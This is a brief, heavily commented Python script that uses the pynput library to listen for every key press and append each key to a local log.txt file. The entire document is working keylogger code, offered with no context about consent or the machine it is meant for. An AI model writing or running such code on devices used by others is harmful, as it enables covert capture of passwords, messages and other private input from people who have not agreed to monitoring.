#libraries needed
#pynput
#keyboard

#Importing necessary modules from the pynput library
from pynput.keyboard import Key, Listener


#This function is called when a key is pressed and appends the key to the log.txt file
def on_press(key):
    with open("log.txt", "a") as f:  # Opening log.txt file in append mode
        f.write(str(key) + "\n")  # Writing the pressed key to the file, followed by a new line

with Listener(on_press=on_press) as listener:  # Creating a keyboard listener
    listener.join()  # Waiting for events (key presses) and handling them with the on_press function